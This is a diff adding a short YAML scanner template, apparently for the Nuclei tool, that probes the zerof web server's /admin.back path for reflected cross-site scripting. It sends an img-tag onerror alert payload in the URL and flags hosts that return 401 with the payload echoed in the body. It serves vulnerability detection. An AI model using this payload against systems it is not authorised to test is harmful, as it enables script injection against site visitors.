@@ -1,0 +1,25 @@
+id: zerof-web-server-admin-xss
+
+info:
+  name: zerof web server /admin.back XSS
+  author: Master先生
+  severity: low
+  tags: zerof,xss
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin.back<img src=a onerror=alert('{{randstr}}')>"
+
+    redirects: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 401
+
+      - type: word
+        words:
+          - "<img src=a onerror=alert('{{randstr}}')>"
+        part: body
